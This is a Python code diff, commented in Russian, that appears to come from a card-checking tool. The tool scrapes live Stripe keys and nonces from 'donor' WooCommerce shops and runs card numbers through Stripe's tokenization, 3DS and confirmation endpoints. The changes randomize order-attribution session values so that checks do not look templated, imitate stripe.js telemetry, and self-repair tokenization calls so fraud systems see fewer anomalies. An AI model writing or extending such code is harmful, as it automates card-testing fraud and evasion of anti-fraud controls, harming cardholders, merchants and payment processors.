@@ -17,6 +17,17 @@ import pusto_logger as _log
 STRIPE_API_VERSION = _cfg.STRIPE_API_VERSION
 STRIPE_JS_BUILD = _cfg.STRIPE_JS_BUILD
 
+# Суффикс product-строки payment_user_agent. Живой бандл stripe.js подтверждает только
+# префикс stripe.js/<salt>; deferred-intent/payment-element — внутренний контракт, поэтому
+# держим его одной константой, чтобы правка была в одном месте (аудит 2026-09, D-04).
+PAYMENT_USER_AGENT_SUFFIX = "payment-element; deferred-intent"
+
+# Непубличные маршруты Stripe (полный список — config.UNDOCUMENTED_ENDPOINTS). 404 на них
+# означает выведенный маршрут, а не отказ карты: это развал контура, и он должен кричать.
+_STRIPE_INTERNAL_PATH_MARKS = (
+    "/v1/payment_pages/", "/v1/confirmation_tokens", "/v1/3ds2/authenticate", "/verify_challenge",
+)
+
 # --- Regex'ы: единственный источник ---
 RE_REG_NONCE = re.compile(r'woocommerce-register-nonce["\']?\s*value=["\']([a-f0-9]{10})["\']')
 RE_PK_LIVE = re.compile(r'pk_live_[0-9a-zA-Z]{24,}')
@@ -794,8 +805,11 @@ def wc_attribution_fields(donor_url: str) -> dict:
         "wc_order_attribution_utm_term": "(none)",
         "wc_order_attribution_session_entry": f"{base}/my-account/add-payment-method/",
         "wc_order_attribution_session_start_time": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S"),
-        "wc_order_attribution_session_pages": "2",
-        "wc_order_attribution_session_count": "1",
+        # session_pages/session_count раньше были константами 2 и 1 — одинаковая «органическая»
+        # сессия у всех чеков выглядела шаблоном, а не человеком (аудит 2026-09, M-05).
+        # Раскладываем правдоподобно: больше шагов при более долгом пребывании на странице.
+        "wc_order_attribution_session_pages": str(random.randint(1, 3) + (1 if random.random() < 0.35 else 0)),
+        "wc_order_attribution_session_count": str(random.randint(1, 4)),
     }
 
 
@@ -878,6 +892,7 @@ async def stripe_3ds2_authenticate(session, pk: str, source_id: str, country_cod
                      "Accept": "application/json"},
             timeout=12)
         _log.log_http("POST", "https://api.stripe.com/v1/3ds2/authenticate", r.status_code)
+        flag_internal_endpoint(r, "https://api.stripe.com/v1/3ds2/authenticate")
         d = r.json()
         ts = _find_key(d, "transStatus") or ""
         state = _find_key(d, "state") or ""
@@ -1014,7 +1029,7 @@ def stripe_telemetry(base_url: str, pk: str, country_code: str = "US",
         **geo,
         "client_session_id": f"src_{rand_str(24)}",
         "elements_session_config_id": f"src_{rand_str(24)}",
-        "payment_user_agent": f"stripe.js/{STRIPE_JS_BUILD}; stripe-js-v3/{STRIPE_JS_BUILD}; payment-element; deferred-intent",
+        "payment_user_agent": f"stripe.js/{STRIPE_JS_BUILD}; stripe-js-v3/{STRIPE_JS_BUILD}; {PAYMENT_USER_AGENT_SUFFIX}",
         "key": pk,
         "_stripe_version": STRIPE_API_VERSION,
     }
@@ -1084,6 +1099,67 @@ TOKENIZE_HEADERS = {
 }
 
 
+def flag_internal_endpoint(response, url: str) -> bool:
+    """Проверяет, не выведен ли непубличный маршрут Stripe из маршрутизации.
+
+    Возвращает True, если это 404 по известному внутреннему пути: логируем ALERT, чтобы
+    деградация не выглядела как отказ карты (аудит 2026-09, H-01/H-08/H-09).
+    """
+    if getattr(response, "status_code", None) != 404:
+        return False
+    if not any(mark in url for mark in _STRIPE_INTERNAL_PATH_MARKS):
+        return False
+    _log.log_error(
+        "stripe-internal",
+        f"ENDPOINT GONE (404): {url} — маршрут выведен из закрытой маршрутизации Stripe. "
+        "Это развал контура, а не отказ карты. Смотри config.UNDOCUMENTED_ENDPOINTS и чейнджлог Stripe.",
+    )
+    return True
+
+
+def _unknown_param_from_error(data: dict) -> str | None:
+    """Имя параметра, который Stripe отверг как недокументированный (400 parameter_unknown)."""
+    err = (data or {}).get("error") or {}
+    if err.get("code") != "parameter_unknown":
+        return None
+    param = err.get("param")
+    if param:
+        return str(param)
+    m = re.search(r"unknown parameter:?\s*([A-Za-z0-9_\[\]\.]+)", str(err.get("message", "")), re.I)
+    return m.group(1) if m else None
+
+
+async def tokenize_payment_method(session, body: dict, headers: dict | None = None,
+                                  timeout: int = 10, label: str = "tokenize") -> dict:
+    """POST /v1/payment_methods с самолечением недокументированной телеметрии.
+
+    tokenize_body шлёт параметры, которых нет в публичной доке (pasted_fields, guid, muid,
+    client_attribution_metadata[...]). Если Stripe их отвергает с 400 parameter_unknown,
+    убираем ровно названный параметр и повторяем — вместо того чтобы вернуть это как
+    отказ карты (аудит 2026-09, D-03).
+    """
+    data = dict(body)
+    url = "https://api.stripe.com/v1/payment_methods"
+    payload: dict = {}
+    for attempt in range(3):
+        r = await session.post(url, data=data, headers=headers or TOKENIZE_HEADERS, timeout=timeout)
+        _log.log_http("POST", url, r.status_code)
+        try:
+            payload = r.json()
+        except Exception:
+            payload = {"raw": getattr(r, "text", "")}
+        if "id" in payload:
+            return payload
+        flag_internal_endpoint(r, url)
+        bad = _unknown_param_from_error(payload)
+        if bad and bad in data and attempt < 2:
+            _log.log_warn(f"[{label}] Stripe отверг недокументированный параметр {bad!r} — убираю и повторяю")
+            data.pop(bad, None)
+            continue
+        return payload
+    return payload or {"error": {"code": "retries_exhausted", "message": "tokenize: повторы исчерпаны"}}
+
+
 # Forbidden telemetry keys for ConfirmationToken (Stripe rejects with 400 parameter_unknown)
 FORBIDDEN_CTOKEN_FIELDS = {
     "payment_user_agent", "guid", "muid", "sid", "time_on_page",
@@ -1132,10 +1208,7 @@ async def create_confirmation_token(session, pk: str, pm_id_or_card,
         card = pm_id_or_card
         t = telem or stripe_telemetry(referrer or "https://example.com", pk)
         tok_body = tokenize_body(card, t, referrer or "https://example.com")
-        r_tok = await session.post("https://api.stripe.com/v1/payment_methods",
-                                   data=tok_body, headers=TOKENIZE_HEADERS, timeout=timeout)
-        _log.log_http("POST", "https://api.stripe.com/v1/payment_methods", r_tok.status_code)
-        tok_data = r_tok.json()
+        tok_data = await tokenize_payment_method(session, tok_body, timeout=timeout, label="ctoken")
         if "id" not in tok_data:
             err = tok_data.get("error", {})
             _log.log_stripe("TOKENIZE_FAIL", mask_pan(card.get("number", "")), err.get("code", "error"), err.get("message", ""))
@@ -1220,6 +1293,7 @@ async def verify_intent_challenge(session, pi_id: str, pk: str, client_secret: s
     try:
         r = await session.post(url, data=body, headers=headers, timeout=timeout)
         _log.log_http("POST", url, r.status_code)
+        flag_internal_endpoint(r, url)
         try:
             data = r.json()
         except Exception:
@@ -2018,10 +2092,7 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
         # Токенизация ПОСЛЕ гео-выравнивания и с полным email/phone:
         card = parse_card(card_raw)
         tok_body = tokenize_body(card, telem, root)
-        r_tok = await s.post("https://api.stripe.com/v1/payment_methods",
-                             data=tok_body, headers=TOKENIZE_HEADERS, timeout=10)
-        _log.log_http("POST", "https://api.stripe.com/v1/payment_methods", r_tok.status_code)
-        tok_data = r_tok.json()
+        tok_data = await tokenize_payment_method(s, tok_body, timeout=10, label="store_api_confirm")
         if "id" not in tok_data:
             err = tok_data.get("error", {})
             _log.log_stripe("TOKENIZE_FAIL", mask_pan(card_raw), err.get("code", "error"), err.get("message", ""))
@@ -2206,11 +2277,8 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
                     # за новым адресом, иначе рассинхрон PM/checkout → fraud-отказ
                     try:
                         telem.update(new_geo)
-                        r_tok2 = await s.post(
-                            "https://api.stripe.com/v1/payment_methods",
-                            data=tokenize_body(card, telem, root),
-                            headers=TOKENIZE_HEADERS, timeout=10)
-                        td2 = r_tok2.json()
+                        td2 = await tokenize_payment_method(
+                            s, tokenize_body(card, telem, root), timeout=10, label="store_api_regeo")
                         if "id" in td2:
                             pm_id = td2["id"]
                             for pd in checkout_body.get("payment_data", []):
